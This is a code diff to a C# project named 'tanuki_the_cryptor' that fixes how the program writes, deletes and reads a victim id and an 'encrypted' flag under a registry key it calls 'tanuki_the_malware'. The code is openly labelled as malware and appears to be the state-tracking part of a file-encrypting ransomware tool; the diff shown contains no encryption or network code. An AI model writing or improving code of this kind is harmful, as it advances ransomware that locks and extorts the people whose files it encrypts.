@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -15,6 +15,7 @@ namespace tanuki_the_cryptor
             if(registryKey != null)
             {
                 registryKey.CreateSubKey("tanuki_the_malware");
+                registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\tanuki_the_malware", true);
                 registryKey.SetValue("id", id);
                 registryKey.Close();
             }
@@ -26,6 +27,7 @@ namespace tanuki_the_cryptor
             if(registryKey != null)
             {
                 registryKey.CreateSubKey("tanuki_the_malware");
+                registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\tanuki_the_malware", true);
                 registryKey.SetValue("encrypted", true);
                 registryKey.Close();
             }      
@@ -38,7 +40,7 @@ namespace tanuki_the_cryptor
             {
                 if(registryKey != null)
                 {
-                    registryKey.DeleteSubKey("tanuki_the_malware");
+                    Registry.CurrentUser.DeleteSubKey("SOFTWARE\\tanuki_the_malware");
                     registryKey.Close();
                 }
             }
@@ -50,8 +52,12 @@ namespace tanuki_the_cryptor
             RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\tanuki_the_malware", false);
             if(registryKey != null)
             {
-                byte[] id = (byte[])registryKey.GetValue("id", null);
-                bool encrypted = (bool)registryKey.GetValue("encrypted", false);
+                byte[] id = null;
+                object id_obj = registryKey.GetValue("id", null);
+                if (id_obj != null)
+                    id = (byte[])id_obj;
+                
+                bool encrypted = Convert.ToBoolean(registryKey.GetValue("encrypted", false));
                 registryKey.Close();
 
                 return (id, encrypted);
